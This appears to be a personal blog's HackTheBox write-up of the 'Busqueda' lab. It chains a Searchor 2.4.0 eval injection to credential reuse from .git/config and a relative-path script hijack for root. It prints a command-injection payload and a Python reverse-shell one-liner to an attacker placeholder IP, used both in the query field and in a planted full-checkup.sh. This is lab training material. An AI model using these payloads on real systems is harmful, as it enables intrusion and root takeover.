@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<meta charset="utf-8" />
+
+  <title>HTB: Busqueda - Writeups, Scripts, &amp; Security Stuff</title>
+
+
+  <meta name="author" content="Tanmay Vemuri"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/latex.css" />
+<link rel="stylesheet" href="http://localhost:1313/css/main.css" />
+<link rel="stylesheet" href="/css/custom.css">
+<script id="MathJax-script" async src="http://localhost:1313/js/tex-mml-chtml.js"></script>
+</head>
+<body class="latex-dark">
+
+
+
+
+
+
+<header>
+  <nav class="navbar">
+  <div class="nav">
+    
+
+    <ul class="nav-links">
+      
+    </ul>
+  </div>
+</nav>
+  <div class="intro-header">
+    <div class="container">
+      <div class="posts-heading">
+        
+          <h1>HTB: Busqueda</h1>
+          
+        
+      </div>
+    </div>
+  </div>
+</header>
+<div id="content">
+  <div class="container" role="main">
+    <article class="article" class="blog-post">
+      <div class="postmeta">
+        <span class="meta-post">
+  <i class="fa fa-calendar-alt"></i>
+  Jul 7, 2025
+  
+    <br><i class="fa fa-folder-open"></i>
+    
+      <a href="http://localhost:1313//categories/hackthebox/">HackTheBox</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/writeups/">Writeups</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/busqueda/">Busque­da</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/linux/">Linux</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/easylevel/">Easy‑level</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/web-app/">Web App</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/python-rce/">Python RCE</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/commandinjection/">Command‑Injection</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/searchor-2.4.0/">Searchor 2.4.0</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/reverseshell/">Reverse‑Shell</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/gitea/">Gitea</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/git-config-creds/">Git config creds</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/ssh-svc-login/">SSH svc login</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/docker-enumeration/">Docker enumeration</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/privilege-escalation/">Privilege Escalation</a>&nbsp;
+    
+      <a href="http://localhost:1313//categories/relative-path-hijack/">Relative Path Hijack</a>&nbsp;
+    
+  
+</span>
+      </div>
+      <br>
+      
+    <center><img src="https://labs.hackthebox.com/storage/avatars/a6942ab57b6a79f71240420442027334.png" alt="Busqueda" width="100" /></center>
+<p>A marked easy machine that involves exploiting a python eval statement in Searchor 2.4.0 to gain foothold, finding a gitea server and a .git folder; thus finding cleartext credentials, following which you find some administration scripts. Exploiting said administration scripts leads to root.</p>
+<h2 id="information-gathering">Information Gathering</h2>
+<p>As always, we begin with a comprehensive nmap scan to gather information about the machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sV -sC -oA report -p- <span style="color:#ef6155">$target</span> -vv --min-rate <span style="color:#f99b15">10000</span>
+</span></span></code></pre></div><p>The output is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span># Nmap 7.97 scan initiated Mon Jul  7 12:37:10 2025 as: nmap -sV -sC -oA report -p- -vv --min-rate 10000 10.129.228.217
+</span></span><span style="display:flex;"><span>Increasing send delay for 10.129.228.217 from 0 to 5 due to 870 out of 2899 dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay for 10.129.228.217 from 5 to 10 due to 1820 out of 6065 dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay for 10.129.228.217 from 20 to 40 due to 496 out of 1651 dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay for 10.129.228.217 from 40 to 80 due to 903 out of 3009 dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay for 10.129.228.217 from 80 to 160 due to 789 out of 2628 dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Nmap scan report for searcher.htb (10.129.228.217)
+</span></span><span style="display:flex;"><span>Host is up, received echo-reply ttl 63 (0.099s latency).
+</span></span><span style="display:flex;"><span>Scanned at 2025-07-07 12:37:10 BST for 22s
+</span></span><span style="display:flex;"><span>Not shown: 65533 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON         VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
+</span></span><span style="display:flex;"><span>|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
+</span></span><span style="display:flex;"><span>|_http-title: Searcher
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD OPTIONS
+</span></span><span style="display:flex;"><span>| http-server-header:
+</span></span><span style="display:flex;"><span>|   Apache/2.4.52 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_  Werkzeug/2.1.2 Python/3.10.6
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /opt/homebrew/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span># Nmap done at Mon Jul  7 12:37:32 2025 -- 1 IP address (1 host up) scanned in 22.43 seconds
+</span></span></code></pre></div><p>This already reveals to us that the intended route is to exploit the web server first, find credentials and login to the ssh server. Visiting the website, we see the following:
+<label for="e34191900096caa1491a8ba178ee7af0" class="sidenote-toggle sidenote-number"></label>
+<input type="checkbox" id="e34191900096caa1491a8ba178ee7af0" class="sidenote-toggle" />
+<span class="sidenote">Don&rsquo;t forget to add the IP Address in <code>/etc/hosts</code> linked to <code>searcher.htb</code>; The server automatically redirects to the same upon entering the IP Address</span>
+.</p>
+<p><img src="images/Searcher.jpg" alt="Searcher"></p>
+<p>Interesting to note is the footer which shows the tech stack being used:</p>
+<p><img src="images/Footer.jpg" alt="Searcher Footer"></p>
+<p>From the github description: Searchor is an all-in-one PyPi Python Library that simplifies web scraping, obtaining information on an topic, and generating search query URLs. Searchor is an a efficient tool for Python developers, with many web development needs in one, with support of over 100+ Engines and custom engines allowed, making it easy for developers to use for their web programming needs in Python without relying on many third-party dependencies. Furthermore, Searchor has a wide range of support, including command line interface and pip.</p>
+<p>Searching on Google for vulnerabilities related to Searchor 2.4.0, we find the very interesting <a href="https://nvd.nist.gov/vuln/detail/cve-2023-43364">CVE-2023-43364</a>, which tells us that Searchor &lt; 2.4.2 use an eval statement in its code and the query we feed directly goes into the eval statement.</p>
+<p>Looking at the <a href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">PoC GitHub</a> repository, we see that the vulnerable code is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#5bc4bf">@click.argument</span>(<span style="color:#48b685">&#34;query&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">search</span>(engine, query, open, copy):
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>        url <span style="color:#5bc4bf">=</span> eval( <span style="color:#776e71"># &lt;&lt;&lt; See here </span>
+</span></span><span style="display:flex;"><span>            <span style="color:#48b685">f</span><span style="color:#48b685">&#34;Engine.</span><span style="color:#f99b15">{</span>engine<span style="color:#f99b15">}</span><span style="color:#48b685">.search(&#39;</span><span style="color:#f99b15">{</span>query<span style="color:#f99b15">}</span><span style="color:#48b685">&#39;, copy_url=</span><span style="color:#f99b15">{</span>copy<span style="color:#f99b15">}</span><span style="color:#48b685">, open_web=</span><span style="color:#f99b15">{</span>open<span style="color:#f99b15">}</span><span style="color:#48b685">)&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        click<span style="color:#5bc4bf">.</span>echo(url)
+</span></span><span style="display:flex;"><span>        searchor<span style="color:#5bc4bf">.</span>history<span style="color:#5bc4bf">.</span>update(engine, query, url)
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">if</span> open:
+</span></span><span style="display:flex;"><span>            click<span style="color:#5bc4bf">.</span>echo(<span style="color:#48b685">&#34;opening browser...&#34;</span>)
+</span></span></code></pre></div><p>Already alarms are ringing off. <code>eval()</code> is a dangerous function that executes the string passed to it as Python code. This means that if we can control the <code>query</code> parameter, we can execute arbitrary commands on the server. Which we can.</p>
+<h2 id="gaining-foothold">Gaining Foothold</h2>
+<p>To exploit this vulnerability, craft a very specific payload string that will</p>
+<ul>
+<li>Close the string</li>
+<li>Do what we want it to do on the system (i.e. a reverse shell)</li>
+<li>Concatenate the first string, the system output and then the third empty string to close the eval statement.</li>
+</ul>
+<p>The payload we will use, for testing first, is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>&#39; + __import__(&#39;os&#39;).system(&#39;id&#39;) + &#39;
+</span></span></code></pre></div><p>This gives us:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#5bc4bf">@click.argument</span>(<span style="color:#48b685">&#34;query&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">search</span>(engine, query, open, copy):
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>        url <span style="color:#5bc4bf">=</span> eval( <span style="color:#776e71"># &lt;&lt;&lt; See here </span>
+</span></span><span style="display:flex;"><span>            <span style="color:#48b685">f</span><span style="color:#48b685">&#34;Engine.</span><span style="color:#f99b15">{</span>engine<span style="color:#f99b15">}</span><span style="color:#48b685">.search(&#39;&#39; + __import__(&#39;os&#39;).system(&#39;id&#39;) + &#39;&#39;, copy_url=</span><span style="color:#f99b15">{</span>copy<span style="color:#f99b15">}</span><span style="color:#48b685">, open_web=</span><span style="color:#f99b15">{</span>open<span style="color:#f99b15">}</span><span style="color:#48b685">)&#34;</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        click<span style="color:#5bc4bf">.</span>echo(url)
+</span></span><span style="display:flex;"><span>        searchor<span style="color:#5bc4bf">.</span>history<span style="color:#5bc4bf">.</span>update(engine, query, url)
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">if</span> open:
+</span></span><span style="display:flex;"><span>            click<span style="color:#5bc4bf">.</span>echo(<span style="color:#48b685">&#34;opening browser...&#34;</span>)
+</span></span></code></pre></div><p>Which gives the output:</p>
+<p><img src="images/Searcher_RCE_Demo.jpg" alt="Searcher RCE Demo"></p>
+<p>We now have Remote Code Execution (RCE) on the server. To get a reverse shell, we can use the following payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#39; + __import__(&#39;os&#39;).system(&#34;&#34;&#34;export RHOST=&#34;&lt;IP ADDRESS&gt;&#34;;export RPORT=&lt;PORT&gt;;python3 -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;sh&#34;)&#39;&#34;&#34;&#34;) + &#39;
+</span></span></code></pre></div><p><label for="8dbefa539cb12c7665a448ca803c1101" class="sidenote-toggle sidenote-number"></label>
+<input type="checkbox" id="8dbefa539cb12c7665a448ca803c1101" class="sidenote-toggle" />
+<span class="sidenote"> Make sure to replace <code>&lt;IP ADDRESS&gt;</code> and <code>&lt;PORT&gt;</code> with your own IP address and port number. </span></p>
+<p>Website becomes stuck, and if you have a listener running with the right IP address and port in the payload, you will get a reverse shell.</p>
+<p><img src="images/revshell_svc.jpg" alt="Reverse Shell"></p>
+<p>Great! We now have a reverse shell. However, we are still a low privileged user. Now comes the difficult part: Privilege Escalation.
+<label for="71f2a5384c2b86cec9cbdc6723a0c9ea" class="sidenote-toggle sidenote-number"></label>
+<input type="checkbox" id="71f2a5384c2b86cec9cbdc6723a0c9ea" class="sidenote-toggle" />
+<span class="sidenote"> If you just want the user.txt, you can find it using <code>cd  ~</code> </span></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Before we can do that, we need to know what user we are and what we can run as sudo.
+<code>whoami</code> gives us:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>svc
+</span></span></code></pre></div><p>Not very useful. Let&rsquo;s check what we can run as sudo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><p>And we quickly run into a problem. We don&rsquo;t have a password and checking <code>sudo -l</code> requires password for even the lower privileged account.</p>
+<p>Looking around, we see a scripts folder in <code>/opt/scripts/</code>. Inspecting the contents, we see a bunch of scripts that are execute only. We can&rsquo;t read, write or execute without sudo.</p>
+<p><img src="images/scripts.jpg" alt="Scripts Folder"></p>
+<p>These will come in handy later. For now, let&rsquo;s look where we landed right after the reverse shell. <code>pwd</code> gives us <code>/var/www/app</code> and running <code>ls -la</code> gives us the following:</p>
+<p><img src="images/lsla.jpg" alt="lsla"></p>
+<p>We see a <code>.git</code> folder. Very useful. Let&rsquo;s look at the <code>config</code> file in the <code>.git</code> folder:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat .git/config
+</span></span></code></pre></div><p>Which gives us a very useful piece of the puzzle:</p>
+<p><img src="images/config.jpg" alt="Config"></p>
+<p>We see that there&rsquo;s a user called <code>cody</code> and a password attached to it. Just for kicks, let&rsquo;s try <code>sshing</code> into this server with <code>svc</code> and the password we found in the <code>.git/config</code> file, and we see that it works!</p>
+<p><img src="images/sshing.jpg" alt="SSH"></p>
+<p>Following this, we can now run <code>sudo -l</code> and see what we can run as sudo:</p>
+<p><img src="images/sudol.jpg" alt="sudo -l"></p>
+<p>Great! Obviously, we can&rsquo;t read the contents of the scripts so we have no way of understanding how to exploit them. But just for kicks, let&rsquo;s try running the one script we can run as sudo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+</span></span></code></pre></div><p>This shows what arguments are allowed which are:</p>
+<ul>
+<li>docker-ps</li>
+<li>docker-inspect</li>
+<li>full-checkup</li>
+</ul>
+<p>Running docker-ps gives us:</p>
+<p><img src="images/dockerps.jpg" alt="Docker PS"></p>
+<p>Running full-checkup gives us:<br>
+<label for="3c98da42b2ae4c6e865801962de0af87" class="sidenote-toggle sidenote-number"></label>
+<input type="checkbox" id="3c98da42b2ae4c6e865801962de0af87" class="sidenote-toggle" />
+<span class="sidenote"> This doesn&rsquo;t work unless you <code>cd</code> into <code>/opt/scripts/</code> first, a clue to what&rsquo;s coming </span></p>
+<p><img src="images/fullcheckup_demo.jpg" alt="Full Checkup"></p>
+<p>And after viewing the documentation for docker-inspect we craft the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect <span style="color:#48b685">&#39;{{json .Config}}&#39;</span> gitea | jq
+</span></span></code></pre></div><p>The first part is what&rsquo;s allowed to us. Second part is the what we want to see and the format, third part is the container name. The command after the pipe formats the output to be more readable. The output is as follows:</p>
+<p><img src="images/dockerinspect.jpg" alt="Docker Inspect"></p>
+<p>We see database credentials, which we can use to login to the gitea server. Looking back into <code>.git/config</code> file, we see that the gitea server is running on <code>gitea.searcher.htb</code>. So we can login to the gitea server using the credentials we found in the <code>.git/config</code> file as <code>administrator</code>.</p>
+<p><img src="images/gitea_login.jpg" alt="Gitea Login"></p>
+<p>Going over to the scripts repository, we see that they are the same scripts we saw in the <code>/opt/scripts/</code> folder. We can now read the contents of the scripts and see what they do, and hopefully figure out how to exploit the scripts to get root.</p>
+<p>Here&rsquo;s the contents of the <code>system-checkup.py</code> script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#776e71">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">subprocess</span>
+</span></span><span style="display:flex;"><span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">sys</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>actions <span style="color:#5bc4bf">=</span> [<span style="color:#48b685">&#39;full-checkup&#39;</span>, <span style="color:#48b685">&#39;docker-ps&#39;</span>,<span style="color:#48b685">&#39;docker-inspect&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">run_command</span>(arg_list):
+</span></span><span style="display:flex;"><span>    r <span style="color:#5bc4bf">=</span> subprocess<span style="color:#5bc4bf">.</span>run(arg_list, capture_output<span style="color:#5bc4bf">=</span><span style="color:#815ba4">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> r<span style="color:#5bc4bf">.</span>stderr:
+</span></span><span style="display:flex;"><span>        output <span style="color:#5bc4bf">=</span> r<span style="color:#5bc4bf">.</span>stderr<span style="color:#5bc4bf">.</span>decode()
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">else</span>:
+</span></span><span style="display:flex;"><span>        output <span style="color:#5bc4bf">=</span> r<span style="color:#5bc4bf">.</span>stdout<span style="color:#5bc4bf">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">return</span> output
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">def</span> <span style="color:#06b6ef">process_action</span>(action):
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">if</span> action <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;docker-inspect&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>            _format <span style="color:#5bc4bf">=</span> sys<span style="color:#5bc4bf">.</span>argv[<span style="color:#f99b15">2</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">if</span> len(_format) <span style="color:#5bc4bf">==</span> <span style="color:#f99b15">0</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#48b685">f</span><span style="color:#48b685">&#34;Format can&#39;t be empty&#34;</span>)
+</span></span><span style="display:flex;"><span>                exit(<span style="color:#f99b15">1</span>)
+</span></span><span style="display:flex;"><span>            container <span style="color:#5bc4bf">=</span> sys<span style="color:#5bc4bf">.</span>argv[<span style="color:#f99b15">3</span>]
+</span></span><span style="display:flex;"><span>            arg_list <span style="color:#5bc4bf">=</span> [<span style="color:#48b685">&#39;docker&#39;</span>, <span style="color:#48b685">&#39;inspect&#39;</span>, <span style="color:#48b685">&#39;--format&#39;</span>, _format, container]
+</span></span><span style="display:flex;"><span>            print(run_command(arg_list)) 
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">except</span> <span style="color:#ef6155">IndexError</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#48b685">f</span><span style="color:#48b685">&#34;Usage: </span><span style="color:#f99b15">{</span>sys<span style="color:#5bc4bf">.</span>argv[<span style="color:#f99b15">0</span>]<span style="color:#f99b15">}</span><span style="color:#48b685"> docker-inspect &lt;format&gt; &lt;container_name&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#f99b15">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">except</span> <span style="color:#ef6155">Exception</span> <span style="color:#815ba4">as</span> e:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#48b685">&#39;Something went wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#f99b15">1</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">elif</span> action <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;docker-ps&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>            arg_list <span style="color:#5bc4bf">=</span> [<span style="color:#48b685">&#39;docker&#39;</span>, <span style="color:#48b685">&#39;ps&#39;</span>]
+</span></span><span style="display:flex;"><span>            print(run_command(arg_list)) 
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">except</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#48b685">&#39;Something went wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#f99b15">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">elif</span> action <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;full-checkup&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>            arg_list <span style="color:#5bc4bf">=</span> [<span style="color:#48b685">&#39;./full-checkup.sh&#39;</span>]
+</span></span><span style="display:flex;"><span>            print(run_command(arg_list))
+</span></span><span style="display:flex;"><span>            print(<span style="color:#48b685">&#39;[+] Done!&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">except</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#48b685">&#39;Something went wrong&#39;</span>)
+</span></span><span style="display:flex;"><span>            exit(<span style="color:#f99b15">1</span>)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#815ba4">if</span> <span style="color:#ef6155">__name__</span> <span style="color:#5bc4bf">==</span> <span style="color:#48b685">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">try</span>:
+</span></span><span style="display:flex;"><span>        action <span style="color:#5bc4bf">=</span> sys<span style="color:#5bc4bf">.</span>argv[<span style="color:#f99b15">1</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">if</span> action <span style="color:#5bc4bf">in</span> actions:
+</span></span><span style="display:flex;"><span>            process_action(action)
+</span></span><span style="display:flex;"><span>        <span style="color:#815ba4">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#815ba4">raise</span> <span style="color:#ef6155">IndexError</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#815ba4">except</span> <span style="color:#ef6155">IndexError</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#48b685">f</span><span style="color:#48b685">&#39;Usage: </span><span style="color:#f99b15">{</span>sys<span style="color:#5bc4bf">.</span>argv[<span style="color:#f99b15">0</span>]<span style="color:#f99b15">}</span><span style="color:#48b685"> &lt;action&gt; (arg1) (arg2)&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#48b685">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#48b685">&#39;     docker-ps     : List running docker containers&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#48b685">&#39;     docker-inspect : Inpect a certain docker container&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#48b685">&#39;     full-checkup  : Run a full system checkup&#39;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#48b685">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#f99b15">1</span>)
+</span></span></code></pre></div><p>On first instinct, you may be tempted to mess with the subprocess.run(). However, it receives the commands we pass in the command line as a list, so we can&rsquo;t inject anything there. However, looking at full-checkup, we see that it runs a script called <code>full-checkup.sh</code>. Even without looking at the contents of the script, we notice one very important thing. The script is specified using relative path (<code>./</code>), i.e relative to where we are at the time of running the script. This means that we can create a script with the same name as in the <code>/opt/scripts/</code> folder and it will be executed instead of the original script.</p>
+<p>This is the full-checkup.sh script that we will create in /home/svc:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#776e71">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#776e71"></span>
+</span></span><span style="display:flex;"><span>export <span style="color:#ef6155">RHOST</span><span style="color:#5bc4bf">=</span><span style="color:#48b685">&#34;&lt;IP ADDRESS&gt;&#34;</span>;export <span style="color:#ef6155">RPORT</span><span style="color:#5bc4bf">=</span>&lt;PORT&gt;;python3 -c <span style="color:#48b685">&#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;sh&#34;)&#39;</span>
+</span></span></code></pre></div><p><label for="8dbefa539cb12c7665a448ca803c1101" class="sidenote-toggle sidenote-number"></label>
+<input type="checkbox" id="8dbefa539cb12c7665a448ca803c1101" class="sidenote-toggle" />
+<span class="sidenote"> Make sure to replace <code>&lt;IP ADDRESS&gt;</code> and <code>&lt;PORT&gt;</code> with your own IP address and port number. </span></p>
+<p>If you have a netcat listener up and running, run</p>
+<div class="highlight"><pre tabindex="0" style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+</span></span></code></pre></div><p>And you will get a reverse shell as root!</p>
+<p><img src="images/rooting.jpg" alt="Root Shell"></p>
+<h1 id="conclusion">Conclusion</h1>
+<p>Overall a very fun machine that involves exploiting an eval statement. I&rsquo;ll be completely honest, I did refer to the 0xdf write-up every once in a while when I got a stuck because of how green I am. But definitely a good learning machine, especially considering it&rsquo;s on the TJNull list of machines, a must do for preparing for OSCP!</p>
+
+
+      
+    </article>
+    
+  </div>
+
+        </div><footer>
+  <div class="container">
+    <p class="credits copyright">
+      <p class="credits theme-by">
+        
+        
+        
+        <a href="http://localhost:1313/">Writeups, Scripts, &amp; Security Stuff</a>,
+        
+        &copy;
+        2025
+        <a href="http://localhost:1313/about/">Tanmay Vemuri</a>
+      </p>
+  </div>
+</footer></body>
+</html>
